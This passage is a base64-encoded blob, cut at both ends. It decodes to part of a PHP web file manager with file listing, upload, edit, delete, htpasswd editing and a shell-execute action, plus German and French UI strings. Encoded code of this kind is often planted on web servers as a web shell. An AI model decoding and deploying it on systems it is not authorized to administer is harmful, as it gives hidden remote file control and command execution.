JfSBlbHNlIHsNCgkJCQllY2hvIGh0bWwoJGZpbGVbJ2ZpbGVuYW1lJ10pOw0KCQkJfQ0KCQkJZWNobyAnIF0nOw0KDQoJCX0gZWxzZSB7DQoNCgkJCWlmIChzdWJzdHIoJGZpbGVbJ2ZpbGVuYW1lJ10sIDAsIDEpID09ICcuJykgew0KCQkJCWVjaG8gJzxpbWcgc3JjPSInIC4gJHNlbGYgLiAnP2ltYWdlPWhpZGRlbl9maWxlIiBhbHQ9ImhpZGRlbiBmaWxlIiAvPiAnOw0KCQkJfSBlbHNlIHsNCgkJCQllY2hvICc8aW1nIHNyYz0iJyAuICRzZWxmIC4gJz9pbWFnZT1maWxlIiBhbHQ9ImZpbGUiIC8+ICc7DQoJCQl9DQoNCgkJCWlmICgkZmlsZVsnaXNfZmlsZSddICYmICRmaWxlWydpc19yZWFkYWJsZSddKSB7DQoJCQkgICBlY2hvICc8YSBocmVmPSInIC4gJHNlbGYgLiAnP2FjdGlvbj12aWV3JmFtcDtmaWxlPScgLiB1cmxlbmNvZGUoJGZpbGVbJ3BhdGgnXSkgLiAnIj4nIC4gaHRtbCgkZmlsZVsnZmlsZW5hbWUnXSkgLiAnPC9hPic7DQoJCQl9IGVsc2Ugew0KCQkJCWVjaG8gaHRtbCgkZmlsZVsnZmlsZW5hbWUnXSk7DQoJCQl9DQoNCgkJfQ0KDQoJCWlmICgkZmlsZVsnc2l6ZSddID49IDEwMDApIHsNCgkJCSRodW1hbiA9ICcgdGl0bGU9IicgLiBodW1hbl9maWxlc2l6ZSgkZmlsZVsnc2l6ZSddKSAuICciJzsNCgkJfSBlbHNlIHsNCgkJCSRodW1hbiA9ICcnOw0KCQl9DQoNCgkJZWNobyAiXHQ8dGQgY2xhc3M9XCJzaXplXCIkaHVtYW4+eyRmaWxlWydzaXplJ119IEI8L3RkPiI7DQoNCgkJaWYgKCEkd2luKSB7DQoNCgkJCWVjaG8gIlx0PHRkIGNsYXNzPVwicGVybWlzc2lvblwiIHRpdGxlPVwiIiAuIGRlY29jdCgkZmlsZVsncGVybWlzc2lvbiddKSAuICciPic7DQoNCgkJCSRsID0gISRmaWxlWydpc19saW5rJ10gJiYgKCFmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldHVpZCcpIHx8ICRmaWxlWydvd25lciddID09IHBvc2l4X2dldHVpZCgpKTsNCgkJCWlmICgkbCkgZWNobyAnPGEgaHJlZj0iJyAuICRzZWxmIC4gJz9hY3Rpb249cGVybWlzc2lvbiZhbXA7ZmlsZT0nIC4gdXJsZW5jb2RlKCRmaWxlWydwYXRoJ10pIC4gJyZhbXA7ZGlyPScgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAnIj4nOw0KCQkJZWNobyBodG1sKHBlcm1pc3Npb25fb2N0YWwyc3RyaW5nKCRmaWxlWydwZXJtaXNzaW9uJ10pKTsNCgkJCWlmICgkbCkgZWNobyAnPC9hPic7DQoNCgkJCWVjaG8gIjwvdGQ+IjsNCg0KCQkJaWYgKGFycmF5X2tleV9leGlzdHMoJ293bmVyX25hbWUnLCAkZmlsZSkpIHsNCgkJCQllY2hvICJcdDx0ZCBjbGFzcz1cIm93bmVyXCIgdGl0bGU9XCJ1aWQ6IHskZmlsZVsnb3duZXInXX1cIj57JGZpbGVbJ293bmVyX25hbWUnXX08L3RkPiI7DQoJCQl9IGVsc2Ugew0KCQkJCWVjaG8gIlx0PHRkIGNsYXNzPVwib3duZXJcIj57JGZpbGVbJ293bmVyJ119PC90ZD4iOw0KCQkJfQ0KCQkJaWYgKGFycmF5X2tleV9leGlzdHMoJ2dyb3VwX25hbWUnLCAkZmlsZSkpIHsNCgkJCQllY2hvICJcdDx0ZCBjbGFzcz1cImdyb3VwXCIgdGl0bGU9XCJnaWQ6IHskZmlsZVsnZ3JvdXAnXX1cIj57JGZpbGVbJ2dyb3VwX25hbWUnXX08L3RkPg0KIjsNCgkJCX0gZWxzZSB7DQoJCQkJZWNobyAiXHQ8dGQgY2xhc3M9XCJncm91cFwiPnskZmlsZVsnZ3JvdXAnXX08L3RkPg0KIjsNCgkJCX0NCg0KCQl9DQoNCgkJZWNobyAnCTx0ZCBjbGFzcz0iZnVuY3Rpb25zIj4NCgkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZScgLiAkaSAuICciIHZhbHVlPSInIC4gaHRtbCgkZmlsZVsncGF0aCddKSAuICciIC8+DQonOw0KDQoJCSRhY3Rpb25zID0gYXJyYXkoKTsNCgkJaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3ltbGluaycpKSB7DQoJCQkkYWN0aW9uc1tdID0gJ2NyZWF0ZV9zeW1saW5rJzsNCgkJfQ0KCQlpZiAoQGlzX3dyaXRhYmxlKGRpcm5hbWUoJGZpbGVbJ3BhdGgnXSkpKSB7DQoJCQkkYWN0aW9uc1tdID0gJ2RlbGV0ZSc7DQoJCQkkYWN0aW9uc1tdID0gJ3JlbmFtZSc7DQoJCQkkYWN0aW9uc1tdID0gJ21vdmUnOw0KCQl9DQoJCWlmICgkZmlsZVsnaXNfZmlsZSddICYmICRmaWxlWydpc19yZWFkYWJsZSddKSB7DQoJCQkkYWN0aW9uc1tdID0gJ2NvcHknOw0KCQkJJGFjdGlvbnNbXSA9ICdkb3dubG9hZCc7DQoJCQlpZiAoJGZpbGVbJ2lzX3dyaXRhYmxlJ10pICRhY3Rpb25zW10gPSAnZWRpdCc7DQoJCX0NCgkJaWYgKCEkd2luICYmIGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpICYmICRmaWxlWydpc19maWxlJ10gJiYgJGZpbGVbJ2lzX2V4ZWN1dGFibGUnXSAmJiBmaWxlX2V4aXN0cygnL2Jpbi9zaCcpKSB7DQoJCQkkYWN0aW9uc1tdID0gJ2V4ZWN1dGUnOw0KCQl9DQoNCgkJaWYgKHNpemVvZigkYWN0aW9ucykgPiAwKSB7DQoNCgkJCWVjaG8gJwkJPHNlbGVjdCBjbGFzcz0ic21hbGwiIG5hbWU9ImFjdGlvbicgLiAkaSAuICciIHNpemU9IjEiPg0KCQk8b3B0aW9uIHZhbHVlPSIiPicgLiBzdHJfcmVwZWF0KCcmbmJzcDsnLCAzMCkgLiAnPC9vcHRpb24+DQonOw0KDQoJCQlmb3JlYWNoICgkYWN0aW9ucyBhcyAkYWN0aW9uKSB7DQoJCQkJZWNobyAiXHRcdDxvcHRpb24gdmFsdWU9XCIkYWN0aW9uXCI+IiAuIHdvcmQoJGFjdGlvbikgLiAiPC9vcHRpb24+DQoiOw0KCQkJfQ0KDQoJCQllY2hvICcJCTwvc2VsZWN0Pg0KCQk8aW5wdXQgY2xhc3M9InNtYWxsIiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCcgLiAkaSAuICciIHZhbHVlPSIgJmd0OyAiIG9uZm9jdXM9ImFjdGl2YXRlKFwnb3RoZXJcJykiIC8+DQonOw0KDQoJCX0NCg0KCQllY2hvICcJPC90ZD4NCjwvdHI+DQonOw0KDQoJfQ0KDQoJZWNobyAnPHRyIGNsYXNzPSJsaXN0aW5nX2Zvb3RlciI+DQoJPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOiByaWdodDsgdmVydGljYWwtYWxpZ246IHRvcCI+PGltZyBzcmM9IicgLiAkc2VsZiAuICc/aW1hZ2U9YXJyb3ciIGFsdD0iJmd0OyIgLz48L3RkPg0KCTx0ZCBjb2xzcGFuPSInIC4gKCRjb2xzIC0gMSkgLiAnIj4NCgkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibnVtIiB2YWx1ZT0iJyAuIHNpemVvZigkbGlzdCkgLiAnIiAvPg0KCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmb2N1cyIgdmFsdWU9IiIgLz4NCgkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ib2xkZGlyIiB2YWx1ZT0iJyAuIGh0bWwoJGRpcmVjdG9yeSkgLiAnIiAvPg0KJzsNCg0KCSRhY3Rpb25zID0gYXJyYXkoKTsNCglpZiAoQGlzX3dyaXRhYmxlKGRpcm5hbWUoJGZpbGVbJ3BhdGgnXSkpKSB7DQoJCSRhY3Rpb25zW10gPSAnZGVsZXRlJzsNCgkJJGFjdGlvbnNbXSA9ICdtb3ZlJzsNCgl9DQoJJGFjdGlvbnNbXSA9ICdjb3B5JzsNCg0KCWVjaG8gJwkJPHNlbGVjdCBjbGFzcz0ic21hbGwiIG5hbWU9ImFjdGlvbl9hbGwiIHNpemU9IjEiPg0KCQk8b3B0aW9uIHZhbHVlPSIiPicgLiBzdHJfcmVwZWF0KCcmbmJzcDsnLCAzMCkgLiAnPC9vcHRpb24+DQonOw0KDQoJZm9yZWFjaCAoJGFjdGlvbnMgYXMgJGFjdGlvbikgew0KCQllY2hvICJcdFx0PG9wdGlvbiB2YWx1ZT1cIiRhY3Rpb25cIj4iIC4gd29yZCgkYWN0aW9uKSAuICI8L29wdGlvbj4NCiI7DQoJfQ0KDQoJZWNobyAnCQk8L3NlbGVjdD4NCgkJPGlucHV0IGNsYXNzPSJzbWFsbCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXRfYWxsIiB2YWx1ZT0iICZndDsgIiBvbmZvY3VzPSJhY3RpdmF0ZShcJ290aGVyXCcpIiAvPg0KCTwvdGQ+DQo8L3RyPg0KJzsNCg0KfQ0KDQpmdW5jdGlvbiBkaXJlY3RvcnlfY2hvaWNlICgpIHsNCglnbG9iYWwgJGRpcmVjdG9yeSwgJGhvbWVkaXIsICRjb2xzLCAkc2VsZjsNCg0KCWVjaG8gJzx0cj4NCgk8dGQgY29sc3Bhbj0iJyAuICRjb2xzIC4gJyIgaWQ9ImRpcmVjdG9yeSI+DQoJCTxhIGhyZWY9IicgLiAkc2VsZiAuICc/ZGlyPScgLiB1cmxlbmNvZGUoJGhvbWVkaXIpIC4gJyI+JyAuIHdvcmQoJ2RpcmVjdG9yeScpIC4gJzwvYT46DQoJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkaXIiIHNpemU9IicgLiB0ZXh0ZmllbGRzaXplKCRkaXJlY3RvcnkpIC4gJyIgdmFsdWU9IicgLiBodG1sKCRkaXJlY3RvcnkpIC4gJyIgb25mb2N1cz0iYWN0aXZhdGUoXCdkaXJlY3RvcnlcJykiIC8+DQoJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImNoYW5nZWRpciIgdmFsdWU9IicgLiB3b3JkKCdjaGFuZ2UnKSAuICciIG9uZm9jdXM9ImFjdGl2YXRlKFwnZGlyZWN0b3J5XCcpIiAvPg0KCTwvdGQ+DQo8L3RyPg0KJzsNCg0KfQ0KDQpmdW5jdGlvbiB1cGxvYWRfYm94ICgpIHsNCglnbG9iYWwgJGNvbHM7DQoNCgllY2hvICc8dHI+DQoJPHRkIGNvbHNwYW49IicgLiAkY29scyAuICciIGlkPSJ1cGxvYWQiPg0KCQknIC4gd29yZCgnZmlsZScpIC4gJzoNCgkJPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9InVwbG9hZCIgb25mb2N1cz0iYWN0aXZhdGUoXCdvdGhlclwnKSIgLz4NCgkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0X3VwbG9hZCIgdmFsdWU9IicgLiB3b3JkKCd1cGxvYWQnKSAuICciIG9uZm9jdXM9ImFjdGl2YXRlKFwnb3RoZXJcJykiIC8+DQoJPC90ZD4NCjwvdHI+DQonOw0KDQp9DQoNCmZ1bmN0aW9uIGNyZWF0ZV9ib3ggKCkgew0KCWdsb2JhbCAkY29sczsNCg0KCWVjaG8gJzx0cj4NCgk8dGQgY29sc3Bhbj0iJyAuICRjb2xzIC4gJyIgaWQ9ImNyZWF0ZSI+DQoJCTxzZWxlY3QgbmFtZT0iY3JlYXRlX3R5cGUiIHNpemU9IjEiIG9uZm9jdXM9ImFjdGl2YXRlKFwnY3JlYXRlXCcpIj4NCgkJPG9wdGlvbiB2YWx1ZT0iZmlsZSI+JyAuIHdvcmQoJ2ZpbGUnKSAuICc8L29wdGlvbj4NCgkJPG9wdGlvbiB2YWx1ZT0iZGlyZWN0b3J5Ij4nIC4gd29yZCgnZGlyZWN0b3J5JykgLiAnPC9vcHRpb24+DQoJCTwvc2VsZWN0Pg0KCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY3JlYXRlX25hbWUiIG9uZm9jdXM9ImFjdGl2YXRlKFwnY3JlYXRlXCcpIiAvPg0KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXRfY3JlYXRlIiB2YWx1ZT0iJyAuIHdvcmQoJ2NyZWF0ZScpIC4gJyIgb25mb2N1cz0iYWN0aXZhdGUoXCdjcmVhdGVcJykiIC8+DQoJPC90ZD4NCjwvdHI+DQonOw0KDQp9DQoNCmZ1bmN0aW9uIGVkaXQgKCRmaWxlKSB7DQoJZ2xvYmFsICRzZWxmLCAkZGlyZWN0b3J5LCAkZWRpdGNvbHMsICRlZGl0cm93cywgJGFwYWNoZSwgJGh0cGFzc3dkLCAkaHRhY2Nlc3M7DQoNCglodG1sX2hlYWRlcigpOw0KDQoJZWNobyAnPGgyIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAzcHQiPicgLiBodG1sKCRmaWxlKSAuICc8L2gyPg0KDQo8Zm9ybSBhY3Rpb249IicgLiAkc2VsZiAuICciIG1ldGhvZD0icG9zdCI+DQoNCjx0YWJsZSBjbGFzcz0iZGlhbG9nIj4NCjx0cj4NCjx0ZCBjbGFzcz0iZGlhbG9nIj4NCg0KCTx0ZXh0YXJlYSBuYW1lPSJjb250ZW50IiBjb2xzPSInIC4gJGVkaXRjb2xzIC4gJyIgcm93cz0iJyAuICRlZGl0cm93cyAuICciIFdSQVA9Im9mZiI+JzsNCg0KCWlmIChhcnJheV9rZXlfZXhpc3RzKCdjb250ZW50JywgJF9QT1NUKSkgew0KCQllY2hvICRfUE9TVFsnY29udGVudCddOw0KCX0gZWxzZSB7DQoJCSRmID0gZm9wZW4oJGZpbGUsICdyJyk7DQoJCXdoaWxlICghZmVvZigkZikpIHsNCgkJCWVjaG8gaHRtbChmcmVhZCgkZiwgODE5MikpOw0KCQl9DQoJCWZjbG9zZSgkZik7DQoJfQ0KDQoJaWYgKCFlbXB0eSgkX1BPU1RbJ3VzZXInXSkpIHsNCgkJZWNobyAiXA0KIiAuICRfUE9TVFsndXNlciddIC4gJzonIC4gY3J5cHQoJF9QT1NUWydwYXNzd29yZCddKTsNCgl9DQoJaWYgKCFlbXB0eSgkX1BPU1RbJ2Jhc2ljX2F1dGgnXSkpIHsNCgkJaWYgKCR3aW4pIHsNCgkJCSRhdXRoZmlsZSA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJGRpcmVjdG9yeSkgLiAkaHRwYXNzd2Q7DQoJCX0gZWxzZSB7DQoJCQkkYXV0aGZpbGUgPSAkZGlyZWN0b3J5IC4gJGh0cGFzc3dkOw0KCQl9DQoJCWVjaG8gIlwNCkF1dGhUeXBlIEJhc2ljXA0KQXV0aE5hbWUgJnF1b3Q7UmVzdHJpY3RlZCBEaXJlY3RvcnkmcXVvdDtcDQoiOw0KCQllY2hvICdBdXRoVXNlckZpbGUgJnF1b3Q7JyAuIGh0bWwoJGF1dGhmaWxlKSAuICImcXVvdDtcDQoiOw0KCQllY2hvICdSZXF1aXJlIHZhbGlkLXVzZXInOw0KCX0NCg0KCWVjaG8gJzwvdGV4dGFyZWE+DQoNCgk8aHIgLz4NCic7DQoNCglpZiAoJGFwYWNoZSAmJiBiYXNlbmFtZSgkZmlsZSkgPT0gJGh0cGFzc3dkKSB7DQoJCWVjaG8gJw0KCScgLiB3b3JkKCd1c2VyJykgLiAnOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlciIgLz4NCgknIC4gd29yZCgncGFzc3dvcmQnKSAuICc6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+DQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IicgLiB3b3JkKCdhZGQnKSAuICciIC8+DQoNCgk8aHIgLz4NCic7DQoNCgl9DQoNCglpZiAoJGFwYWNoZSAmJiBiYXNlbmFtZSgkZmlsZSkgPT0gJGh0YWNjZXNzKSB7DQoJCWVjaG8gJw0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImJhc2ljX2F1dGgiIHZhbHVlPSInIC4gd29yZCgnYWRkX2Jhc2ljX2F1dGgnKSAuICciIC8+DQoNCgk8aHIgLz4NCic7DQoNCgl9DQoNCgllY2hvICcNCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJlZGl0IiAvPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSInIC4gaHRtbCgkZmlsZSkgLiAnIiAvPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRpciIgdmFsdWU9IicgLiBodG1sKCRkaXJlY3RvcnkpIC4gJyIgLz4NCgk8aW5wdXQgdHlwZT0icmVzZXQiIHZhbHVlPSInIC4gd29yZCgncmVzZXQnKSAuICciIGlkPSJyZWRfYnV0dG9uIiAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InNhdmUiIHZhbHVlPSInIC4gd29yZCgnc2F2ZScpIC4gJyIgaWQ9ImdyZWVuX2J1dHRvbiIgc3R5bGU9Im1hcmdpbi1sZWZ0OiA1MHB4IiAvPg0KDQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQoNCjxwPjxhIGhyZWY9IicgLiAkc2VsZiAuICc/ZGlyPScgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAnIj5bICcgLiB3b3JkKCdiYWNrJykgLiAnIF08L2E+PC9wPg0KDQo8L2Zvcm0+DQoNCic7DQoNCglodG1sX2Zvb3RlcigpOw0KDQp9DQoNCmZ1bmN0aW9uIHNwYWNlciAoKSB7DQoJZ2xvYmFsICRjb2xzOw0KDQoJZWNobyAnPHRyPg0KCTx0ZCBjb2xzcGFuPSInIC4gJGNvbHMgLiAnIiBzdHlsZT0iaGVpZ2h0OiAxZW0iPjwvdGQ+DQo8L3RyPg0KJzsNCg0KfQ0KDQpmdW5jdGlvbiB0ZXh0ZmllbGRzaXplICgkY29udGVudCkgew0KDQoJJHNpemUgPSBzdHJsZW4oJGNvbnRlbnQpICsgNTsNCglpZiAoJHNpemUgPCAzMCkgJHNpemUgPSAzMDsNCg0KCXJldHVybiAkc2l6ZTsNCg0KfQ0KDQpmdW5jdGlvbiByZXF1ZXN0X2R1bXAgKCkgew0KDQoJZm9yZWFjaCAoJF9SRVFVRVNUIGFzICRrZXkgPT4gJHZhbHVlKSB7DQoJCWVjaG8gIlx0PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiIiAuIGh0bWwoJGtleSkgLiAnIiB2YWx1ZT0iJyAuIGh0bWwoJHZhbHVlKSAuICJcIiAvPiI7DQoJfQ0KDQp9DQoNCi8qIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gKi8NCg0KZnVuY3Rpb24gaHRtbCAoJHN0cmluZykgew0KCWdsb2JhbCAkc2l0ZV9jaGFyc2V0Ow0KCXJldHVybiBodG1sZW50aXRpZXMoJHN0cmluZywgRU5UX0NPTVBBVCwgJHNpdGVfY2hhcnNldCk7DQp9DQoNCmZ1bmN0aW9uIHdvcmQgKCR3b3JkKSB7DQoJZ2xvYmFsICR3b3JkcywgJHdvcmRfY2hhcnNldDsNCglyZXR1cm4gaHRtbGVudGl0aWVzKCR3b3Jkc1skd29yZF0sIEVOVF9DT01QQVQsICR3b3JkX2NoYXJzZXQpOw0KfQ0KDQpmdW5jdGlvbiBwaHJhc2UgKCRwaHJhc2UsICRhcmd1bWVudHMpIHsNCglnbG9iYWwgJHdvcmRzOw0KCXN0YXRpYyAkc2VhcmNoOw0KDQoJaWYgKCFpc19hcnJheSgkc2VhcmNoKSkgZm9yICgkaSA9IDE7ICRpIDw9IDg7ICRpKyspICRzZWFyY2hbXSA9ICIlJGkiOw0KDQoJZm9yICgkaSA9IDA7ICRpIDwgc2l6ZW9mKCRhcmd1bWVudHMpOyAkaSsrKSB7DQoJCSRhcmd1bWVudHNbJGldID0gbmwyYnIoaHRtbCgkYXJndW1lbnRzWyRpXSkpOw0KCX0NCg0KCSRyZXBsYWNlID0gYXJyYXkoJ3snID0+ICc8cHJlPicsICd9JyA9Pic8L3ByZT4nLCAnWycgPT4gJzxiPicsICddJyA9PiAnPC9iPicpOw0KDQoJcmV0dXJuIHN0cl9yZXBsYWNlKCRzZWFyY2gsICRhcmd1bWVudHMsIHN0cl9yZXBsYWNlKGFycmF5X2tleXMoJHJlcGxhY2UpLCAkcmVwbGFjZSwgbmwyYnIoaHRtbCgkd29yZHNbJHBocmFzZV0pKSkpOw0KDQp9DQoNCmZ1bmN0aW9uIGdldHdvcmRzICgkbGFuZykgew0KCWdsb2JhbCAkd29yZF9jaGFyc2V0LCAkZGF0ZV9mb3JtYXQ7DQoNCglzd2l0Y2ggKCRsYW5nKSB7DQoJY2FzZSAnZGUnOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICdkLm0ueSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnSVNPLTg4NTktMSc7DQoNCgkJcmV0dXJuIGFycmF5KA0KJ2RpcmVjdG9yeScgPT4gJ1ZlcnplaWNobmlzJywNCidmaWxlJyA9PiAnRGF0ZWknLA0KJ2ZpbGVuYW1lJyA9PiAnRGF0ZWluYW1lJywNCg0KJ3NpemUnID0+ICdHcj8/ZScsDQoncGVybWlzc2lvbicgPT4gJ1JlY2h0ZScsDQonb3duZXInID0+ICdFaWduZXInLA0KJ2dyb3VwJyA9PiAnR3J1cHBlJywNCidvdGhlcicgPT4gJ0FuZGVyZScsDQonZnVuY3Rpb25zJyA9PiAnRnVua3Rpb25lbicsDQoNCidyZWFkJyA9PiAnbGVzZW4nLA0KJ3dyaXRlJyA9PiAnc2NocmVpYmVuJywNCidleGVjdXRlJyA9PiAnYXVzZj9ocmVuJywNCg0KJ2NyZWF0ZV9zeW1saW5rJyA9PiAnU3ltbGluayBlcnN0ZWxsZW4nLA0KJ2RlbGV0ZScgPT4gJ2w/c2NoZW4nLA0KJ3JlbmFtZScgPT4gJ3VtYmVuZW5uZW4nLA0KJ21vdmUnID0+ICd2ZXJzY2hpZWJlbicsDQonY29weScgPT4gJ2tvcGllcmVuJywNCidlZGl0JyA9PiAnZWRpdGllcmVuJywNCidkb3dubG9hZCcgPT4gJ2hlcnVudGVybGFkZW4nLA0KJ3VwbG9hZCcgPT4gJ2hvY2hsYWRlbicsDQonY3JlYXRlJyA9PiAnZXJzdGVsbGVuJywNCidjaGFuZ2UnID0+ICd3ZWNoc2VsbicsDQonc2F2ZScgPT4gJ3NwZWljaGVybicsDQonc2V0JyA9PiAnc2V0emUnLA0KJ3Jlc2V0JyA9PiAnenVyP2Nrc2V0emVuJywNCidyZWxhdGl2ZScgPT4gJ1BmYWQgenVtIFppZWwgcmVsYXRpdicsDQoNCid5ZXMnID0+ICdKYScsDQonbm8nID0+ICdOZWluJywNCidiYWNrJyA9PiAnenVyP2NrJywNCidkZXN0aW5hdGlvbicgPT4gJ1ppZWwnLA0KJ3N5bWxpbmsnID0+ICdTeW1ib2xpc2NoZXIgTGluaycsDQonbm9fb3V0cHV0JyA9PiAna2VpbmUgQXVzZ2FiZScsDQoNCid1c2VyJyA9PiAnQmVudXR6ZXJuYW1lJywNCidwYXNzd29yZCcgPT4gJ0tlbm53b3J0JywNCidhZGQnID0+ICdoaW56dWY/Z2VuJywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ0hUVFAtQmFzaWMtQXV0aCBoaW56dWY/Z2VuJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIHd1cmRlIGhvY2hnZWxhZGVuLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIGtvbm50ZSBuaWNodCBob2NoZ2VsYWRlbiB3ZXJkZW4uJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBleGlzdGllcnQgYmVyZWl0cy4nLA0KJ2NyZWF0ZWQnID0+ICciWyUxXSIgd3VyZGUgZXJzdGVsbHQuJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBrb25udGUgbmljaHQgZXJzdGVsbHQgd2VyZGVuLicsDQoncmVhbGx5X2RlbGV0ZScgPT4gJ1NvbGxlbiBmb2xnZW5kZSBEYXRlaWVuIHdpcmtsaWNoIGdlbD9zY2h0IHdlcmRlbj8nLA0KJ2RlbGV0ZWQnID0+ICJGb2xnZW5kZSBEYXRlaWVuIHd1cmRlbiBnZWw/c2NodDpcDQpbJTFdIiwNCidub3RfZGVsZXRlZCcgPT4gIkZvbGdlbmRlIERhdGVpZW4ga29ubnRlbiBuaWNodCBnZWw/c2NodCB3ZXJkZW46XA0KWyUxXSIsDQoncmVuYW1lX2ZpbGUnID0+ICdCZW5lbm5lIERhdGVpIHVtOicsDQoncmVuYW1lZCcgPT4gJyJbJTFdIiB3dXJkZSBpbiAiWyUyXSIgdW1iZW5hbm50LicsDQonbm90X3JlbmFtZWQnID0+ICciWyUxXSBrb25udGUgbmljaHQgaW4gIlslMl0iIHVtYmVuYW5udCB3ZXJkZW4uJywNCidtb3ZlX2ZpbGVzJyA9PiAnVmVyc2NoaWViZW4gZm9sZ2VuZGUgRGF0ZWllbjonLA0KJ21vdmVkJyA9PiAiRm9sZ2VuZGUgRGF0ZWllbiB3dXJkZW4gbmFjaCBcIlslMl1cIiB2ZXJzY2hvYmVuOlwNClslMV0iLA0KJ25vdF9tb3ZlZCcgPT4gIkZvbGdlbmRlIERhdGVpZW4ga29ubnRlbiBuaWNodCBuYWNoIFwiWyUyXVwiIHZlcnNjaG9iZW4gd2VyZGVuOlwNClslMV0iLA0KJ2NvcHlfZmlsZXMnID0+ICdLb3BpZXJlIGZvbGdlbmRlIERhdGVpZW46JywNCidjb3BpZWQnID0+ICJGb2xnZW5kZSBEYXRlaWVuIHd1cmRlbiBuYWNoIFwiWyUyXVwiIGtvcGllcnQ6XA0KWyUxXSIsDQonbm90X2NvcGllZCcgPT4gIkZvbGdlbmRlIERhdGVpZW4ga29ubnRlbiBuaWNodCBuYWNoIFwiWyUyXVwiIGtvcGllcnQgd2VyZGVuOlwNClslMV0iLA0KJ25vdF9lZGl0ZWQnID0+ICciWyUxXSIga2FubiBuaWNodCBlZGl0aWVydCB3ZXJkZW4uJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIHd1cmRlIGVyZm9sZ3JlaWNoIGF1c2dlZj9ocnQ6XA0KeyUyfSIsDQonbm90X2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIga29ubnRlIG5pY2h0IGVyZm9sZ3JlaWNoIGF1c2dlZj9ocnQgd2VyZGVuOlwNCnslMn0iLA0KJ3NhdmVkJyA9PiAnIlslMV0iIHd1cmRlIGdlc3BlaWNoZXJ0LicsDQonbm90X3NhdmVkJyA9PiAnIlslMV0iIGtvbm50ZSBuaWNodCBnZXNwZWljaGVydCB3ZXJkZW4uJywNCidzeW1saW5rZWQnID0+ICdTeW1ib2xpc2NoZXIgTGluayB2b24gIlslMl0iIG5hY2ggIlslMV0iIHd1cmRlIGVyc3RlbGx0LicsDQonbm90X3N5bWxpbmtlZCcgPT4gJ1N5bWJvbGlzY2hlciBMaW5rIHZvbiAiWyUyXSIgbmFjaCAiWyUxXSIga29ubnRlIG5pY2h0IGVyc3RlbGx0IHdlcmRlbi4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnUmVjaHRlIGY/ciAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJ0RpZSBSZWNodGUgZj9yICJbJTFdIiB3dXJkZW4gYXVmIFslMl0gZ2VzZXR6dC4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ0RpZSBSZWNodGUgZj9yICJbJTFdIiBrb25udGVuIG5pY2h0IGF1ZiBbJTJdIGdlc2V0enQgd2VyZGVuLicsDQonbm90X3JlYWRhYmxlJyA9PiAnIlslMV0iIGthbm4gbmljaHQgZ2VsZXNlbiB3ZXJkZW4uJw0KCQkpOw0KDQoJY2FzZSAnZnInOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICdkLm0ueSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnSVNPLTg4NTktMSc7DQoNCgkJcmV0dXJuIGFycmF5KA0KJ2RpcmVjdG9yeScgPT4gJ1I/cGVydG9pcmUnLA0KJ2ZpbGUnID0+ICdGaWNoaWVyJywNCidmaWxlbmFtZScgPT4gJ05vbSBmaWNoaWVyJywNCg0KJ3NpemUnID0+ICdUYWlsbGUnLA0KJ3Blcm1pc3Npb24nID0+ICdEcm9pdHMnLA0KJ293bmVyJyA9PiAnUHJvcHJpP3RhaXJlJywNCidncm91cCcgPT4gJ0dyb3VwZScsDQonb3RoZXInID0+ICdBdXRyZXMnLA0KJ2Z1bmN0aW9ucycgPT4gJ0ZvbmN0aW9ucycsDQoNCidyZWFkJyA9PiAnTGlyZScsDQond3JpdGUnID0+ICdFY3JpcmUnLA0KJ2V4ZWN1dGUnID0+ICdFeD9jdXRlcicsDQoNCidjcmVhdGVfc3ltb